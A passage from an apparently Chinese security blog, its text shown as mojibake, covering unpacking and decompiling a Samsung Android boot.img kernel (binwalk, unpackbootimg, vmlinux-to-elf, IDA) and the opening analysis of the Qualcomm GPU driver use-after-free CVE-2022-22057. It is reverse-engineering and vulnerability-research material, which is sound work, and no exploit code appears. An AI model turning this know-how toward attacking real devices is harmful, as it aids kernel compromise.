class="line">25973076      0x18C5154       DES SP1, little endian</span><br><span class="line">25987348      0x18C8914       CRC32 polynomial table, little endian</span><br><span class="line">26020915      0x18D0C33       HTML document header</span><br><span class="line">26021215      0x18D0D5F       HTML document footer</span><br><span class="line">26693504      0x1974F80       CRC32 polynomial table, little endian</span><br><span class="line">27586276      0x1A4EEE4       ELF, 64-bit LSB shared object, version 1 (GNU/Linux)</span><br><span class="line">27587596      0x1A4F40C       Certificate <span class="keyword">in</span> DER format (x509 v3), header length: 4, sequence length: 1087</span><br><span class="line">27588687      0x1A4F84F       Certificate <span class="keyword">in</span> DER format (x509 v3), header length: 4, sequence length: 1169</span><br><span class="line">27589860      0x1A4FCE4       Certificate <span class="keyword">in</span> DER format (x509 v3), header length: 4, sequence length: 1161</span><br><span class="line">27593748      0x1A50C14       ELF, 64-bit LSB shared object, version 1 (GNU/Linux)</span><br><span class="line">27595068      0x1A5113C       Certificate <span class="keyword">in</span> DER format (x509 v3), header length: 4, sequence length: 1087</span><br><span class="line">27596159      0x1A5157F       Certificate <span class="keyword">in</span> DER format (x509 v3), header length: 4, sequence length: 1169</span><br><span class="line">27597332      0x1A51A14       Certificate <span class="keyword">in</span> DER format (x509 v3), header length: 4, sequence length: 1161</span><br><span class="line">27987715      0x1AB0F03       Base64 standard index table</span><br><span class="line">28041856      0x1ABE280       SHA256 <span class="built_in">hash</span> constants, little endian</span><br><span class="line">28051156      0x1AC06D4       AES Inverse S-Box</span><br><span class="line">33382378      0x1FD5FEA       Unix path: /home/dpi/qb5_8814/workspace/P4_1716/android/kernel/msm-4.14/arch/arm64/kernel/entry.S</span><br><span class="line">33941962      0x205E9CA       Unix path: /dev/block/bootdevice/by-name/param</span><br><span class="line">33946482      0x205FB72       Unix path: /dev/block/platform/soc/%s/by-name/debug</span><br><span class="line">34055474      0x207A532       Unix path: /sys/kernel/debug/dri.</span><br><span class="line">34066784      0x207D160       Unix path: /sys/kernel/debug/dri/%pd/%s</span><br><span class="line">34066849      0x207D1A1       Unix path: /sys/kernel/debug/dri/%s</span><br><span class="line">34066988      0x207D22C       Unix path: /sys/kernel/debug/dri.</span><br><span class="line">34318013      0x20BA6BD       Unix path: /sys/kernel/debug/dri/%pd/perf</span><br><span class="line">34431339      0x20D616B       Unix path: /lib/firmware/updates/4.14.190-21058543-abG9730ZCU5FUC2</span><br><span class="line">34435626      0x20D722A       Unix path: /dev/disk/by-partlabel</span><br><span class="line">34536061      0x20EFA7D       Unix path: /sys/kernel/debug/.../reset_controller</span><br><span class="line">34696677      0x2116DE5       Neighborly text, <span class="string">&quot;neighbor reportbr_req&quot;</span></span><br><span class="line">34696768      0x2116E40       Neighborly text, <span class="string">&quot;neighbor reportiled to send neighbor report request, error=%d&quot;</span></span><br><span class="line">34696844      0x2116E8C       Neighborly text, <span class="string">&quot;neighbor report request, error=%d_list&quot;</span></span><br><span class="line">34709707      0x211A0CB       Neighborly text, <span class="string">&quot;Neighbor Report frame with incorrect length %dhbor report (token = %d)&quot;</span></span><br><span class="line">34709766      0x211A106       Neighborly text, <span class="string">&quot;neighbor report (token = %d)nt with length %d&quot;</span></span><br><span class="line">34709808      0x211A130       Neighborly text, <span class="string">&quot;Neighbor Report element with length %dxx:xx:x%x:%02x&quot;</span></span><br><span class="line">34895079      0x21474E7       Base64 standard index table</span><br><span class="line">34948093      0x21543FD       PARity archive data - file number 20549</span><br><span class="line">35031879      0x2168B47       Unix path: /dev/bus/usb/%03d/%03d</span><br><span class="line">35643506      0x21FE072       Copyright string: <span class="string">&quot;Copyright(c) Pierre Ossman&quot;</span></span><br><span class="line">35706231      0x220D577       Unix path: /sys/firmware/devicetree/base</span><br><span class="line">35708171      0x220DD0B       Unix path: /sys/firmware/fdt<span class="string">&#x27;: CRC check failed</span></span><br><span class="line"><span class="string">36119484      0x22723BC       Unix path: /sys/class/sec/hall_ic/hall_detect</span></span><br><span class="line"><span class="string">36144593      0x22785D1       Unix path: /sys/class/lcd/panel/SVC_OCTA</span></span><br><span class="line"><span class="string">36147765      0x2279235       Unix path: /sys/class/lcd/panel/window_type</span></span><br><span class="line"><span class="string">36579849      0x22E2A09       Neighborly text, &quot;neighbor table overflow!s %x&quot;</span></span><br><span class="line"><span class="string">36623432      0x22ED448       Neighborly text, &quot;NeighborSolicitsdev_snmp6&quot;</span></span><br><span class="line"><span class="string">36623449      0x22ED459       Neighborly text, &quot;NeighborAdvertisementsnuse %d&quot;</span></span><br><span class="line"><span class="string">36629463      0x22EEBD7       Neighborly text, &quot;neighbor %.2x%.2x.%pM lostename link %s to %s&quot;</span></span><br><span class="line"><span class="string">36649206      0x22F38F6       Neighborly text, &quot;NeighborhHWMPactivePathTimeout&quot;</span></span><br><span class="line"><span class="string">40332015      0x2676AEF       Certificate in DER format (x509 v3), header length: 4, sequence length: 928</span></span><br><span class="line"><span class="string">40349716      0x267B014       Certificate in DER format (x509 v3), header length: 4, sequence length: 1353</span></span><br><span class="line"><span class="string">40352532      0x267BB14       Certificate in DER format (x509 v3), header length: 4, sequence length: 928</span></span><br><span class="line"><span class="string">40392092      0x268559C       ASCII cpio archive (SVR4 with no CRC), file name: &quot;dev&quot;, file name length: &quot;0x00000004&quot;, file size: &quot;0x00000000&quot;</span></span><br><span class="line"><span class="string">40392208      0x2685610       ASCII cpio archive (SVR4 with no CRC), file name: &quot;dev/console&quot;, file name length: &quot;0x0000000C&quot;, file size: &quot;0x00000000&quot;</span></span><br><span class="line"><span class="string">40392332      0x268568C       ASCII cpio archive (SVR4 with no CRC), file name: &quot;root&quot;, file name length: &quot;0x00000005&quot;, file size: &quot;0x00000000&quot;</span></span><br><span class="line"><span class="string">40392448      0x2685700       ASCII cpio archive (SVR4 with no CRC), file name: &quot;TRAILER!!!&quot;, file name length: &quot;0x0000000B&quot;, file size: &quot;0x00000000&quot;</span></span><br><span class="line"><span class="string">45887996      0x2BC31FC       Unix path: /sys/power/cpufreq_max_limit 1497600</span></span><br><span class="line"><span class="string">45888040      0x2BC3228       Unix path: /sys/power/cpufreq_max_limit -1</span></span><br><span class="line"><span class="string">46123652      0x2BFCA84       LZMA compressed data, properties: 0xC8, dictionary size: 536870912 bytes, uncompressed size: 78 bytes</span></span><br><span class="line"><span class="string">48199859      0x2DF78B3       Intel x86 or x64 microcode, pf_mask 0x8000, 2000-01-20, size 18882560</span></span><br><span class="line"><span class="string">49215524      0x2EEF824       Flattened device tree, size: 500187 bytes, version: 17</span></span><br><span class="line"><span class="string">49715711      0x2F699FF       Flattened device tree, size: 497909 bytes, version: 17</span></span><br><span class="line"><span class="string">50213620      0x2FE32F4       Flattened device tree, size: 173 bytes, version: 17</span></span><br></pre></td></tr></table></figure>

<p>åšå®¢ä¸Šè¯´çš„å†…æ ¸åœ°å€å¹¶æ²¡æœ‰ï¼Œå¯èƒ½æ˜¯ä¸‰æ˜Ÿçš„é­”æ”¹å¤ªå¤šï¼š</p>
<p><img src="https://bbs.pediy.com/upload/attach/202103/849527_FZZ32HHFFGUYUG2.png"></p>
<p>å¯ä»¥ç”¨<code>binwalk -e</code>æå–ï¼Œä½†æ˜¯æ•ˆæœå·®ç‚¹ã€‚</p>
<h2 id="unpackbootimgè§£åŒ…"><a href="#unpackbootimgè§£åŒ…" class="headerlink" title="unpackbootimgè§£åŒ…"></a>unpackbootimgè§£åŒ…</h2><p>å¯ä»¥ç”¨è¿™ä¸ª<a target="_blank" rel="noopener" href="https://github.com/anestisb/android-unpackbootimg%E6%88%96https://github.com/osm0sis/mkbootimg%E6%8F%90%E5%8F%96%EF%BC%8C%E8%BF%98%E6%9C%89%60imgtool%60%E6%8F%90%E5%8F%96%E3%80%82">https://github.com/anestisb/android-unpackbootimgæˆ–https://github.com/osm0sis/mkbootimgæå–ï¼Œè¿˜æœ‰`imgtool`æå–ã€‚</a></p>
<p>æå–å‡ºæ¥çš„ç»“æœï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">âœ ./unpackbootimg -i boot.img -o boot-out</span><br><span class="line">ANDROID! magic found at: 0</span><br><span class="line">BOARD_KERNEL_CMDLINE console=null androidboot.hardware=qcom androidboot.console=ttyMSM0 androidboot.memcg=1 lpm_levels.sleep_disabled=1 video=vfb:640x400,bpp=32,memsize=3072000 msm_rtb.filter=0x237 service_locator.enable=1 swiotlb=2048 androidboot.usbcontroller=a600000.dwc3 firmware_class.path=/vendor/firmware_mnt/image</span><br><span class="line">BOARD_KERNEL_BASE 0x00000000</span><br><span class="line">BOARD_NAME RILRI20B005</span><br><span class="line">BOARD_PAGE_SIZE 4096</span><br><span class="line">BOARD_HASH_TYPE sha1</span><br><span class="line">BOARD_KERNEL_OFFSET 0x00008000</span><br><span class="line">BOARD_RAMDISK_OFFSET 0x00000000</span><br><span class="line">BOARD_SECOND_OFFSET 0x00000000</span><br><span class="line">BOARD_TAGS_OFFSET 0x01e00000</span><br><span class="line">BOARD_OS_VERSION 11.0.0</span><br><span class="line">BOARD_OS_PATCH_LEVEL 2021-03</span><br><span class="line">BOARD_HEADER_VERSION 1</span><br><span class="line">BOARD_HEADER_SIZE 1648</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">âœ <span class="built_in">ls</span> -al</span><br><span class="line">total 98168</span><br><span class="line">drwxr-xr-x  2 DarkMatter  staff       544  6 23 21:16 .</span><br><span class="line">drwx------@ 4 DarkMatter  staff       544  6 23 21:16 ..</span><br><span class="line">-rw-r--r--  1 DarkMatter  staff        11  6 23 21:16 boot.img-base</span><br><span class="line">-rw-r--r--  1 DarkMatter  staff        12  6 23 21:16 boot.img-board</span><br><span class="line">-rw-r--r--  1 DarkMatter  staff       301  6 23 21:16 boot.img-cmdline</span><br><span class="line">-rw-r--r--  1 DarkMatter  staff         5  6 23 21:16 boot.img-hashtype</span><br><span class="line">-rw-r--r--  1 DarkMatter  staff         3  6 23 21:16 boot.img-header_version</span><br><span class="line">-rw-r--r--  1 DarkMatter  staff  50209697  6 23 21:16 boot.img-kernel</span><br><span class="line">-rw-r--r--  1 DarkMatter  staff        11  6 23 21:16 boot.img-kernel_offset</span><br><span class="line">-rw-r--r--  1 DarkMatter  staff         8  6 23 21:16 boot.img-os_patch_level</span><br><span class="line">-rw-r--r--  1 DarkMatter  staff         7  6 23 21:16 boot.img-os_version</span><br><span class="line">-rw-r--r--  1 DarkMatter  staff         5  6 23 21:16 boot.img-pagesize</span><br><span class="line">-rw-r--r--  1 DarkMatter  staff         0  6 23 21:16 boot.img-ramdisk</span><br><span class="line">-rw-r--r--  1 DarkMatter  staff        11  6 23 21:16 boot.img-ramdisk_offset</span><br><span class="line">-rw-r--r--  1 DarkMatter  staff        11  6 23 21:16 boot.img-second_offset</span><br><span class="line">-rw-r--r--  1 DarkMatter  staff        11  6 23 21:16 boot.img-tags_offset</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œ<code>boot.img-kernel</code>æ˜¾ç¤ºæ˜¯æœªå‹ç¼©çš„é•œåƒï¼š</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">âœ hexdump -C -n 32 boot.img-kernel</span><br><span class="line">00000000  55 4e 43 4f 4d 50 52 45  53 53 45 44 5f 49 4d 47  |UNCOMPRESSED_IMG|</span><br><span class="line">00000010  10 e8 ee 02 00 00 96 14  00 00 00 00 00 00 08 00  |.ï¿½ï¿½.............|</span><br><span class="line">00000020</span><br></pre></td></tr></table></figure>

<h2 id="imjtoolè§£åŒ…-æ²¡æµ‹è¯•"><a href="#imjtoolè§£åŒ…-æ²¡æµ‹è¯•" class="headerlink" title="imjtoolè§£åŒ…(æ²¡æµ‹è¯•)"></a>imjtoolè§£åŒ…(æ²¡æµ‹è¯•)</h2><p>è¿™é‡Œä½¿ç”¨<a target="_blank" rel="noopener" href="http://newandroidbook.com/tools/imjtool.html">imjtool</a>å·¥å…·ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./imjtool &lt;path to boot.img&gt; extract</span><br></pre></td></tr></table></figure>

<p>è§£åŒ…åçš„æ–‡ä»¶å°†è¢«æ”¾åœ¨<code>./extracted</code>ç›®å½•, åˆ†åˆ«æœ‰<code>kernel</code>(å†…æ ¸image), <code>kernelimage</code>(å†…æ ¸defconfig), <code>ramdisk</code>(ramdiskåŒ…, é€šå¸¸æ˜¯<code>cpio</code>æ ¼å¼)</p>
<h2 id="é¢„å¤„ç†Image"><a href="#é¢„å¤„ç†Image" class="headerlink" title="é¢„å¤„ç†Image"></a>é¢„å¤„ç†Image</h2><p>è¿™é‡Œæˆ‘ä»¬é€‰æ‹©<a target="_blank" rel="noopener" href="https://github.com/nforest/droidimg">droidimg</a>æ¥é…åˆ<code>IDA Pro</code>å®Œæˆè¿™ä¸ªä»»åŠ¡ã€‚</p>
<p><strong>è·³è¿‡å¤´éƒ¨æ ‡è¯†</strong></p>
<p><code>Linux</code>å†…æ ¸åœ¨ç”Ÿæˆçš„æ—¶å€™æœ‰æ—¶ä¼šåœ¨å¤´éƒ¨æ·»åŠ ä¸€äº›<a target="_blank" rel="noopener" href="https://github.com/wloot/raphael/blob/43be2402d4fa363ac6eb89431d4f49ce4d189c42/arch/arm64/boot/Makefile#L51">ä¿¡æ¯</a>, ä»¥ä¾›<code>fastboot</code>è¯»å–. ä¸€èˆ¬æ¥è¯´åˆ†åˆ«æ˜¯, 16å­—èŠ‚çš„<code>UNCOMPRESSED_IMG</code>å’Œ4å­—èŠ‚çš„å¤§å°ä¿¡æ¯ã€‚</p>
<p><strong>éªŒè¯</strong></p>
<p>è¿™é‡Œå…ˆç›´æ¥ä½¿ç”¨<code>IDA Pro</code>æ‰“å¼€æœªç»å¤„ç†çš„Image, å¤„ç†å™¨ç±»å‹è®°å¾—é€‰æ‹©<code>ARM Little-endian</code>(ä¸ç”¨çº ç»“, Androidè®¾å¤‡å…¨æ˜¯<code>Little-endian</code>), ä¸€è·¯ç¡®å®šå°±è¡Œã€‚</p>
<p>åˆ‡æ¢åˆ°16è¿›åˆ¶æŸ¥çœ‹å™¨é¡µé¢, å¯ä»¥å¾ˆæ¸…æ¥šçš„çœ‹åˆ°å¤´éƒ¨æœ‰<code>UNCOMPRESSED_IMG</code>æ ‡è¯†ã€‚</p>
<p><strong>å¤„ç†</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if=&lt;path to origin image&gt; of=&lt;path to patched image&gt; bs=1 skip=20</span><br></pre></td></tr></table></figure>

<p><strong>å¯¹å¯ç”¨kaslrçš„å†…æ ¸è¿›è¡Œé¢å¤–å¤„ç†</strong></p>
<p><strong>éªŒè¯</strong></p>
<p>è¿˜è®°å¾—åˆšåˆšæ‹¿åˆ°çš„<code>kernelimage</code>ä¸, æ‰“å¼€ä»–. æœç´¢<code>CONFIG_RANDOMIZE_BASE=y</code>, å¦‚æœæœ‰åŒ¹é…å†…å®¹è¯´æ˜å°±éœ€è¦è¿›è¡Œä¸‹ä¸€æ­¥å¤„ç†äº†</p>
<p><strong>å¤„ç†</strong></p>
<p>è¿›å…¥<code>droidimg</code>ç›®å½•å¹¶è‡ªè¡Œç¼–è¯‘<code>fix_kaslr_arm64.c</code>ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;fix_kaslr_arm64&gt; &lt;patch to origin image&gt; &lt;path to patched image&gt;</span><br></pre></td></tr></table></figure>

<h2 id="åç¼–è¯‘Image"><a href="#åç¼–è¯‘Image" class="headerlink" title="åç¼–è¯‘Image"></a>åç¼–è¯‘Image</h2><h3 id="å®‰è£…droidimgåˆ°ida"><a href="#å®‰è£…droidimgåˆ°ida" class="headerlink" title="å®‰è£…droidimgåˆ°ida"></a>å®‰è£…droidimgåˆ°ida</h3><p>å°†<code>droidimg</code>ç›®å½•ä¸‹çš„<code>vmlinux.py</code>å¤åˆ¶è¿›<code>IDA Pro</code>å®‰è£…ç›®å½•ä¸‹çš„<code>loaders</code>é‡Œ, æ³¨æ„ä½ å¯èƒ½éœ€è¦è§£å†³ç›¸åº”çš„<code>python</code>ä¾èµ–ã€‚</p>
<h3 id="æ‰“å¼€Image"><a href="#æ‰“å¼€Image" class="headerlink" title="æ‰“å¼€Image"></a>æ‰“å¼€Image</h3><p>æœ€åç”¨<code>IDA Pro</code>æ‰“å¼€æˆ‘ä»¬æœ€ç»ˆçš„Image, æ–‡ä»¶ç±»å‹é€‰æ‹©<code>Android/Linux Kernel Image(ARM)</code>å³å¯ã€‚</p>
<h2 id="vmlinux-to-elf-å¼ºçƒˆæ¨èğŸŒŸ"><a href="#vmlinux-to-elf-å¼ºçƒˆæ¨èğŸŒŸ" class="headerlink" title="vmlinux-to-elf(å¼ºçƒˆæ¨èğŸŒŸ)"></a>vmlinux-to-elf(å¼ºçƒˆæ¨èğŸŒŸ)</h2><p>è¿™ä¸ªå·¥å…·å¥½ä½¿<a target="_blank" rel="noopener" href="https://github.com/marin-m/vmlinux-to-elf%EF%BC%8C%E8%83%BD%E8%A7%A3%E6%9E%90%E5%87%BA%60boot.img%60%E4%B8%AD%E4%B8%8D%E5%B0%91%E4%B8%9C%E8%A5%BF%E3%80%82">https://github.com/marin-m/vmlinux-to-elfï¼Œèƒ½è§£æå‡º`boot.img`ä¸­ä¸å°‘ä¸œè¥¿ã€‚</a></p>
<p>ç”Ÿæˆä¸€ä¸ª <code>.ELF</code> æ–‡ä»¶ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ IDA Pro å’Œ Ghidra è¿›è¡Œåˆ†æã€‚</p>
<p>åŠŸèƒ½ï¼š</p>
<ul>
<li>å°†åŸå§‹æ–‡ä»¶ <code>[OK blob]</code> æˆ– ELF å†…æ ¸ä½œä¸ºè¾“å…¥</li>
<li>è‡ªåŠ¨æ£€æµ‹å’Œè§£åŒ… <code>Linux</code> å†…æ ¸ä½¿ç”¨çš„ä¸»è¦å‹ç¼©æ ¼å¼ [OK]</li>
<li>è¾“å…¥æ–‡ä»¶ä¸­å¹¶æŸ¥æ‰¾åµŒå…¥å†…æ ¸ç¬¦å·è¡¨(kalls) [OK]</li>
<li>å…¶ä»–æŒ‡ä»¤é›†æ¶æ„ã€å­—èŠ‚åºä½å¤§å°ã€ä¾èµ–äºçš„é€šç”¨å‡½æ•°ç­¾å [OK]</li>
<li>ä» <code>kallsyms </code>ä¸­åŒ…å«çš„ç¬¦å·æ¥çº¿å™¨å†…æ ¸çš„è¡¨ç‚¹ [OK]</li>
<li>å†…æ ¸ä¸ºå†…æ ¸ï¼Œæä¾›åŸºæœ¬è§£é‡Šï¼Œå®ƒè€ƒè™‘ä½åŸºåœ°å€ï¼ˆç°åœ¨æ˜¯ç¬¬ä¸€ä¸ªåœ°å€ï¼‰</li>
<li>è§£å‹æŸç§ç±»å‹çš„ Android <code>boot.img</code>æ–‡ä»¶ï¼Œä»¥ä¸€ç§<code>ANDROID!</code>æˆ–<code>UNCOMPRESSED_IMG</code>é­”æœ¯çš„å½¢å¼å‘ˆç° [OK]</li>
<li>ä½¿ç”¨ IDA Pro æˆ– Ghidra ç”Ÿæˆå¯å®Œå…¨åˆ†æçš„ .ELF æ–‡ä»¶ä½œä¸ºè¾“å‡º [OK]</li>
</ul>
<p>å®‰è£…ç›´æ¥<code>python setup.py install</code>å³å¯ã€‚</p>
<p><img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/WX20220623-220539@2x.png" alt="WX20220623-220539@2x"></p>
<p><img src="/Users/DarkMatter/Documents/Hacking/Blog/source/pictures/WX20220623-220748@2x.png" alt="WX20220623-220748@2x"></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2022-06-18T08:50:51.000Z" title="2022/6/18 16:50:51">2022-06-18</time></span><span class="level-item">Updated&nbsp;<time dateTime="2022-06-20T14:08:16.790Z" title="2022/6/20 22:08:16">2022-06-20</time></span><span class="level-item">2 hours read (About 13695 words)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2022/06/18/Qualcomm-GPU%E9%A9%B1%E5%8A%A8UAF%E6%BC%8F%E6%B4%9E-CVE-2022-22057/">Qualcomm GPUé©±åŠ¨UAFæ¼æ´(CVE-2022-22057)</a></p><div class="content"><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>åˆæ˜¯ä¸€ç¯‡å…³äº<code>Qualcomm</code>é©±åŠ¨ç¨‹åºçš„æ¼æ´ï¼Œç„¶è€Œä¸Šä¸€ç¯‡å…³äºé©±åŠ¨çš„æ¼æ´è¿˜æ²¡å»éªŒè¯å‘¢ğŸ˜®â€ğŸ’¨</p>
<p>ä»Šå¤©è¿™ä¸€ç¯‡æ˜¯å®˜å‘˜<code>Qualcomm GPU</code>çš„ UAF æ¼æ´ï¼Œå½±å“æ­è½½äº†<code>Snapdragon 888</code>åŠä»¥ä¸ŠèŠ¯ç‰‡ã€å†…æ ¸ç‰ˆæœ¬ä¸º 5.4 åŠä»¥ä¸Šçš„è®¾å¤‡ï¼Œå¦‚S21ã€Galaxy Z Flip3ç­‰ã€‚</p>
<p>é«˜é€šçš„å®‰å…¨å…¬å‘Šï¼š<a target="_blank" rel="noopener" href="https://docs.qualcomm.com/product/publicresources/securitybulletin/may-2022-bulletin.html">Qualcomm security bulletin in May 2022</a>ã€‚</p>
<h2 id="ä¸ºä»€ä¹ˆè¦æŒ–GPUé©±åŠ¨æ¼æ´å‘¢ï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆè¦æŒ–GPUé©±åŠ¨æ¼æ´å‘¢ï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆè¦æŒ–GPUé©±åŠ¨æ¼æ´å‘¢ï¼Ÿ"></a>ä¸ºä»€ä¹ˆè¦æŒ–GPUé©±åŠ¨æ¼æ´å‘¢ï¼Ÿ</h2><ol>
<li>GPU é©±åŠ¨ä¸­æœ‰å¾ˆå¤šç¼“è§£æªæ–½ï¼›</li>
<li>2021å¹´åœ¨é‡åˆ©ç”¨çš„ Android 0Day æ¼æ´æœ‰7ä¸ªï¼Œå…¶ä¸­5ä¸ªæ˜¯å…³äº GPU é©±åŠ¨çš„ï¼›</li>
<li>GPU é©±åŠ¨å¯ä»¥ä»æœªä¿¡ä»»çš„åº”ç”¨æ²™ç®±ä¸­è¿›è¡Œè®¿é—®ï¼›</li>
<li>å¤§å¤šæ•°çš„ GPU é©±åŠ¨éƒ½ä¼šå¤„ç† GPU å’Œ CPU ä¹‹é—´çš„å¤æ‚çš„å†…å­˜å…±äº«é€»è¾‘ï¼Œå¤„ç†ç²¾å¿ƒåˆ¶ä½œçš„æ¶æ„ä»£ç å°†å¯¼è‡´ä»»æ„å†…å­˜è¯»å†™ã€‚ç”±äºæ”»å‡»è€…æ»¥ç”¨GPU å†…å­˜ç®¡ç†ä»£ç ï¼Œå°†å¯¼è‡´å†…å­˜æŸåéš¾ä»¥æ£€æµ‹ï¼Œä»¥åŠå¯¹ç°æœ‰çš„ç¼“è§£æªæ–½å…ç–«ï¼›<ol>
<li>è¿™é‡Œæœ‰ä¸¤ä¸ªæ»¥ç”¨ GPU opcode çš„ä¾‹å­ï¼š<a target="_blank" rel="noopener" href="https://github.com/secmob/TiYunZong-An-Exploit-Chain-to-Remotely-Root-Modern-Android-Devices/blob/master/us-20-Gong-TiYunZong-An-Exploit-Chain-to-Remotely-Root-Modern-Android-Devices-wp.pdf">Guang Gong</a> å’Œ <a target="_blank" rel="noopener" href="https://googleprojectzero.blogspot.com/2020/09/attacking-qualcomm-adreno-gpu.html">Ben Hawkes</a>ã€‚</li>
</ol>
</li>
</ol>
<h1 id="æ¼æ´ä¿¡æ¯"><a href="#æ¼æ´ä¿¡æ¯" class="headerlink" title="æ¼æ´ä¿¡æ¯"></a>æ¼æ´ä¿¡æ¯</h1><p>æ¼æ´æ˜¯åœ¨Qualcomm <a target="_blank" rel="noopener" href="https://git.codelinaro.org/clo/la/kernel/msm-5.4/-/tree/msm-5.4.r2">msm 5.4 kernel</a> ä¸­å¼•å…¥çš„ï¼Œå¢åŠ äº†<a target="_blank" rel="noopener" href="https://git.codelinaro.org/clo/la/kernel/msm-5.4/-/blob/e0952b5cce5bcccbe04a18a9673869e6924ccac0/drivers/gpu/msm/kgsl_timeline.c">kgsl timeline</a>ç‰¹æ€§å’Œä¸€äº›<code>ioctl</code>ã€‚<code>msm 5.4</code> å†…æ ¸å¯¹å†…æ ¸å›¾å½¢æ”¯æŒå±‚ï¼ˆkgslï¼‰é©±åŠ¨ç¨‹åºï¼ˆä½äº<code>drivers/gpu/msm</code>ä¸‹ï¼‰è¿›è¡Œäº†ä¸€äº›ç›¸å½“é‡è¦çš„é‡æ„ï¼Œå¹¶å¼•å…¥äº†ä¸€äº›æ–°åŠŸèƒ½ã€‚å°±æ˜¯è¿™äº›æ–°åŠŸèƒ½å’Œé‡æ„ï¼Œå¯¼è‡´äº†æ–°çš„å®‰å…¨é—®é¢˜ã€‚å…¶ä¸­å¤§éƒ¨åˆ†æ˜¯åœ¨å†…éƒ¨å‘ç°å¹¶ä¿®å¤çš„ï¼Œç„¶ååœ¨å…¬å‘Šä¸­ä½œä¸ºå®‰å…¨é—®é¢˜å…¬å¼€æŠ«éœ²ã€‚</p>
<p> <code>kgsl_timeline</code> å¯¹è±¡å¯ä»¥é€šè¿‡<a target="_blank" rel="noopener" href="https://git.codelinaro.org/clo/la/kernel/msm-5.4/-/blob/e0952b5cce5bcccbe04a18a9673869e6924ccac0/drivers/gpu/msm/kgsl_timeline.c#L323"><code>IOCTL_KGSL_TIMELINE_CREATE</code></a> å’Œ <a target="_blank" rel="noopener" href="https://git.codelinaro.org/clo/la/kernel/msm-5.4/-/blob/e0952b5cce5bcccbe04a18a9673869e6924ccac0/drivers/gpu/msm/kgsl_timeline.c#L96"><code>IOCTL_KGSL_TIMELINE_DESTROY</code></a>è¿›è¡Œåˆ›å»ºå’Œé”€æ¯ã€‚ <code>kgsl_timeline</code>å¯¹è±¡åœ¨å…¶ <a target="_blank" rel="noopener" href="https://git.codelinaro.org/clo/la/kernel/msm-5.4/-/blob/e0952b5cce5bcccbe04a18a9673869e6924ccac0/drivers/gpu/msm/kgsl_timeline.h#L26"><code>fences</code></a>å­—æ®µä¸­å­˜å‚¨äº†ä¸€ä¸ª <a target="_blank" rel="noopener" href="https://www.kernel.org/doc/html/v5.9/driver-api/dma-buf.html"><code>dma_fence</code></a> å¯¹è±¡é“¾è¡¨ã€‚ä½¿ç”¨<a target="_blank" rel="noopener" href="https://git.codelinaro.org/clo/la/kernel/msm-5.4/-/blob/e0952b5cce5bcccbe04a18a9673869e6924ccac0/drivers/gpu/msm/kgsl_timeline.c#L427"><code>IOCTL_KGSL_TIMELINE_FENCE_GET</code></a> å’Œ <a target="_blank" rel="noopener" href="https://git.codelinaro.org/clo/la/kernel/msm-5.4/-/blob/e0952b5cce5bcccbe04a18a9673869e6924ccac0/drivers/gpu/msm/kgsl_timeline.c#L358"><code>IOCTL_KGSL_TIMELINE_WAIT</code></a>å‘é“¾è¡¨ä¸­æ·»åŠ <code>dma_fence</code>å¯¹è±¡ã€‚æ·»åŠ çš„<code>dma_fence</code>å¯¹è±¡æ˜¯<code>refcounted</code>å¯¹è±¡ï¼Œ<code>dma_fence_put</code>æ–¹æ³•ç”¨äºå‡å°‘å®ƒä»¬çš„<code>refcount</code>ã€‚</p>
<p>æœ‰è¶£çš„æ˜¯ï¼Œ <code>timeline-&gt;fences</code> å¹¶æ²¡æœ‰çœŸçš„æŒæœ‰ä¸€ä¸ª<code>fences</code>çš„<code>refcount</code>ã€‚åä¹‹ï¼Œä¸ºäº†é¿å… <code>timeline-&gt;fences</code> ä¸­çš„ <code>dma_fence</code> è¢«é‡Šæ”¾ï¼Œä½¿ç”¨äº†ä¸€ä¸ªè‡ªå®šä¹‰çš„ <a target="_blank" rel="noopener" href="https://git.codelinaro.org/clo/la/kernel/msm-5.4/-/blob/5e3cf80f1b6a12fcf54b007f3c9f235f35b9b7f1/drivers/gpu/msm/kgsl_timeline.c#L231"><code>release</code></a> å‡½æ•°ï¼š <a target="_blank" rel="noopener" href="https://git.codelinaro.org/clo/la/kernel/msm-5.4/-/blob/5e3cf80f1b6a12fcf54b007f3c9f235f35b9b7f1/drivers/gpu/msm/kgsl_timeline.c#L165"><code>timeline_fence_release</code></a> ï¼Œåœ¨<code>dma_fence</code>è¢«é‡Šæ”¾ä¹‹å‰ï¼Œ <code>timeline_fence_release</code> ä» <code>timeline-&gt;fences</code> 